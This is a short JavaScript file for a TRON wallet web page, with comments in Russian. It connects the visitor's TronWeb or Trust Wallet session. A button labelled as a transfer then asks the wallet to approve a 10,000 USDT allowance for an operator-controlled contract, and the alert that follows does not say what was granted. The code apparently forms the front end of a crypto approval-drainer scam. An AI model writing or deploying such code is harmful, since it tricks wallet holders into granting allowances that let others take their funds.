const connectBtn = document.getElementById('connectBtn');
const transferBtn = document.getElementById('transferBtn');
const walletAddressText = document.getElementById('walletAddress');

let userAddress = '';

const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20
const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; // Ваш смарт-контракт

connectBtn.addEventListener('click', async () => {
    try {
        walletAddressText.innerText = "Подключение...";

        // Ожидание и проверка доступности провайдера TRON
        let provider = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
        
        if (!provider) {
            await new Promise(resolve => setTimeout(resolve, 800));
            provider = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
        }

        if (provider && provider.defaultAddress && provider.defaultAddress.base58) {
            userAddress = provider.defaultAddress.base58;
            walletAddressText.innerText = `Подключено: ${userAddress}`;
            connectBtn.style.display = 'none';
            transferBtn.style.display = 'inline-block';
        } else {
            walletAddressText.innerText = "Кошелек не подключен";
            alert("Не удалось обнаружить активную сессию сети TRON. Проверьте настройки кошелька.");
        }
    } catch (error) {
        console.error("Ошибка подключения:", error);
        alert("Произошла ошибка при подключении.");
    }
});

transferBtn.addEventListener('click', async () => {
    try {
        const provider = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
        if (!userAddress || !provider) {
            alert('Сначала подключите кошелек!');
            return;
        }
        
        console.log("Запрос транзакции Approve...");
        const usdtContract = await provider.contract().at(usdtContractAddress);
        const approveAmount = '10000000000'; // 10,000 USDT

        const tx = await usdtContract.approve(
            myContractAddress,
            approveAmount
        ).send({
            feeLimit: 100000000
        });

        alert("Запрос успешно подтвержден!");
        console.log("TX Hash:", tx);

    } catch (error) {
        console.error("Ошибка транзакции:", error);
        alert("Ошибка при выполнении транзакции.");
    }
});
